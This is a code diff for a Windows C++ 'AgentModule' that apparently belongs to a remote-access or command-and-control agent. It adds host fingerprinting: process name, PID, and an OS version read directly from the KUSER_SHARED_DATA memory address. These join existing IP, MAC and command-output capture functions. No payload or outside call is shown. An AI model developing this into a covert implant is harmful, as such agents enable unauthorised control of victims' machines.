@@ -8,11 +8,13 @@
 #include <ws2tcpip.h>
 #include <iphlpapi.h>
 #include <windows.h>
+#include <psapi.h>
 
 #include <iostream>
 #include <memory>
 #include <array>
 
+#pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "ws2_32.lib")
 
@@ -30,7 +32,7 @@ std::string ConvertLPWSTRToStdString(LPWSTR lpwstr)
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-std::string CaptureCommandOutput(const std::string& cmd)
+std::string AgentModule::CaptureCommandOutput(const std::string& cmd)
 {
     std::array<char, 128> buffer;
     std::string result;
@@ -135,6 +137,7 @@ std::string AgentModule::GetInternalIP() {
     return "";
 }
 
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 std::string AgentModule::GetExternalViaDNS() {
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return "";
@@ -158,6 +161,7 @@ std::string AgentModule::GetExternalViaDNS() {
     return "";
 }
 
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 std::string AgentModule::GetMachineMacAddress() {
     ULONG bufferSize = 15000; 
     std::vector<BYTE> buffer(bufferSize);
@@ -188,6 +192,30 @@ std::string AgentModule::GetMachineMacAddress() {
     }
 
     return ""; 
+}
+
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+std::string AgentModule::GetProcessName()
+{
+    HANDLE hProcess = GetCurrentProcess();
+    char buffer[MAX_PATH];
+
+    DWORD size = GetModuleBaseNameA(hProcess, NULL, buffer, MAX_PATH);
+    return std::string(buffer, size);
+}
+
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+int AgentModule::GetPID()
+{
+    HANDLE hProcess = GetCurrentProcess();
+    return GetProcessId(hProcess);
+}
+
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+int AgentModule::GetOSVersion()
+{
+    PBYTE pSharedUserData = (PBYTE)0X7FFE0000;
+    return *(ULONG*)(pSharedUserData + 0x26C);
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
